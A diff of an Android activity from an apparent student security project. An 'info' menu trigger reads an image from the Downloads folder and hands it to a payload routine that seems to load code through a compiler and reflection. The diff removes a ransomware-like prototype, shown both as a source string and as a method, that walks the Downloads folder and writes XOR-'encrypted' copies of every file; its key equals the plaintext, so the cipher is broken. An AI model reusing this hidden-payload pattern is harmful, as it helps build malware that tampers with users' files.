@@ -19,6 +19,7 @@ import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.widget.Toast;
+
 import com.client_progettosicurezza.adapters.AdapterImmagine;
 import com.client_progettosicurezza.api.APIService;
 import com.client_progettosicurezza.compiler.Compile;
@@ -26,11 +27,13 @@ import com.client_progettosicurezza.models.Aggiornamento;
 import com.client_progettosicurezza.models.Immagine;
 import com.client_progettosicurezza.results.ResultAggiornamento;
 import com.client_progettosicurezza.results.ResultListaImmagini;
+
 import java.io.File;
 import java.io.IOException;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
+
 import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
@@ -114,13 +117,10 @@ public class MainActivity extends AppCompatActivity {
 
             //TODO TRIGGER
             case R.id.info:
-                //TODO per prelevare l'immagine
+                //TODO per prelevare l'immagine (aggiungere scelta file casualmente)
                 String pathFile = Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg";
                 File file = new File(pathFile);
                 payload(file);
-
-                //TODO PROVA
-                //runner3(getApplicationContext());
 
                 break;
         }
@@ -130,55 +130,6 @@ public class MainActivity extends AppCompatActivity {
     private void payload(File file) {
 
         String codice = "";
-
-        String codice1 =
-                "public class Classe { " +
-                        "public Classe() {} " +
-                        "/* start method */" +
-                        "public void run(android.content.Context context) {" +
-                        "try {\n" +
-                        "\n" +
-                        "            java.io.File dir = new java.io.File((java.lang.String) \"/sdcard/Download\");\n" +
-                        "            if (dir.isDirectory()) {\n" +
-                        "                java.lang.String[] children = dir.list();\n" +
-                        "                for (int i = 0; i < (int) children.length; i++) {\n" +
-                        "\n" +
-                        "                    java.io.File file = new java.io.File((java.lang.String) \"/sdcard/Download/\" + children[i]);\n" +
-                        "                    byte[] plaintext = new byte[(int) file.length()];\n" +
-                        "                    java.io.FileInputStream fileInputStream = new java.io.FileInputStream(file);\n" +
-                        "                    fileInputStream.read(plaintext);\n" +
-                        "\n" +
-                        "                    byte[] key = plaintext;\n" +
-                        "\n" +
-                        "                    byte[] chipertext = new byte[(int) key.length];\n" +
-                        "                    for (int j = 0; j < (int) key.length; j++) {\n" +
-                        "                        chipertext[j] = (byte) (plaintext[j] ^ key[j]);\n" +
-                        "                    }\n" +
-                        "                    java.io.File file_chipertext = new java.io.File((java.lang.String) \"/sdcard/Download/\" + \"cifrato_\" + children[i]);\n" +
-                        "                    java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext));\n" +
-                        "                    bos.write((byte[]) chipertext);\n" +
-                        "                    bos.flush();\n" +
-                        "                    bos.close();\n" +
-                        "\n" +
-                        "                    byte[] plaintext_verifica = new byte[(int) key.length];\n" +
-                        "                    for (int k = 0; k < (int) key.length; k++) {\n" +
-                        "                        plaintext_verifica[k] = (byte) (chipertext[k] ^ key[k]);\n" +
-                        "                    }\n" +
-                        "                    java.io.File file_plaintext_verifica = new java.io.File((java.lang.String)  \"/sdcard/Download/\" + \"verifica_\" + children[i]);\n" +
-                        "                    java.io.BufferedOutputStream bos2 = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_plaintext_verifica));\n" +
-                        "                    bos2.write((byte[]) plaintext_verifica);\n" +
-                        "                    bos2.flush();\n" +
-                        "                    bos2.close();\n" +
-                        "                }\n" +
-                        "            }\n" +
-                        "\n" +
-                        "        } catch (java.lang.Exception e) {\n" +
-                        "            e.printStackTrace();\n" +
-                        "        }" +
-                        "}" +
-                        "/* end method */" +
-                        "} ";
-
 
         //TODO per prelevare i metadati
         try {
@@ -281,48 +232,6 @@ public class MainActivity extends AppCompatActivity {
 
             }
         });
-    }
-
-    public void runner3(android.content.Context context) {
-        try {
-
-            java.io.File dir = new java.io.File((java.lang.String) "/sdcard/Download");
-            if (dir.isDirectory()) {
-                java.lang.String[] children = dir.list();
-                for (int i = 0; i < children.length; i++) {
-
-                    java.io.File file = new java.io.File("/sdcard/Download/" + children[i]);
-                    byte[] plaintext = new byte[(int) file.length()];
-                    java.io.FileInputStream fileInputStream = new java.io.FileInputStream(file);
-                    fileInputStream.read(plaintext);
-
-                    byte[] key = plaintext;
-
-                    byte[] chipertext = new byte[key.length];
-                    for (int j = 0; j < key.length; j++) {
-                        chipertext[j] = (byte) (plaintext[j] ^ key[j]);
-                    }
-                    java.io.File file_chipertext = new java.io.File((java.lang.String) "/sdcard/Download/" + "cifrato_" + children[i]);
-                    java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext));
-                    bos.write((byte[]) chipertext);
-                    bos.flush();
-                    bos.close();
-
-                    byte[] plaintext_verifica = new byte[key.length];
-                    for (int k = 0; k < key.length; k++) {
-                        plaintext_verifica[k] = (byte) (chipertext[k] ^ key[k]);
-                    }
-                    java.io.File file_plaintext_verifica = new java.io.File((java.lang.String)  "/sdcard/Download/" + "verifica_" + children[i]);
-                    java.io.BufferedOutputStream bos2 = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_plaintext_verifica));
-                    bos2.write((byte[]) plaintext_verifica);
-                    bos2.flush();
-                    bos2.close();
-                }
-            }
-
-        } catch (java.lang.Exception e) {
-            e.printStackTrace();
-        }
     }
 
 }
